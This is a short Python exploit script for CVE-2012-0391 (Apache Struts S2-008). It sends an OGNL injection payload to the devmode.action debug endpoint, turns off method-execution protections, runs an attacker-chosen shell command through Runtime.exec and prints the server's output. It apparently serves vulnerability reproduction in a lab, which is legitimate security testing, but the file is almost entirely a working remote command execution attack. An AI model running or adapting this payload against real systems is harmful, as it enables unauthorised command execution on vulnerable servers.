# coding=utf-8
"""
DATE:   2021/12/29
AUTHOR: TesterCC
DESC: CVE-2012-0391
"""
import json
from optparse import OptionParser

import requests


def attack():
    # initialization
    ret = dict()
    ret['status'] = str()
    ret['info'] = None

    try:
        usage = "Usage: %prog --ip <host_ip> --port <host_port> --cmd <execute_command>"
        parser = OptionParser(usage=usage)
        parser.add_option('--ip', action="store", dest="ip")
        parser.add_option('--port', action="store", dest="port", default='8080')
        parser.add_option('--cmd', action="store", dest="cmd")

        options, args = parser.parse_args()
        ip = options.ip
        port = options.port
        cmd = options.cmd

        url = f"http://{ip}:{port}/S2-008/devmode.action?debug=command&expression=(%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23foo%3Dnew%20java.lang.Boolean%28%22false%22%29%20%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%23foo%2C@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27{cmd}%27%29.getInputStream%28%29%29)"

        r = requests.get(url=url)

        if r.status_code == 200:
            ret['status'] = "success"
            ret['info'] = r.text

    except:
        ret['status'] = "fail"

    print(json.dumps(ret))


if __name__ == '__main__':
    # python3 Apache_Struts_输入数据篡改.py --ip 10.0.4.148 --port 8080 --cmd "ls -al"
    attack()
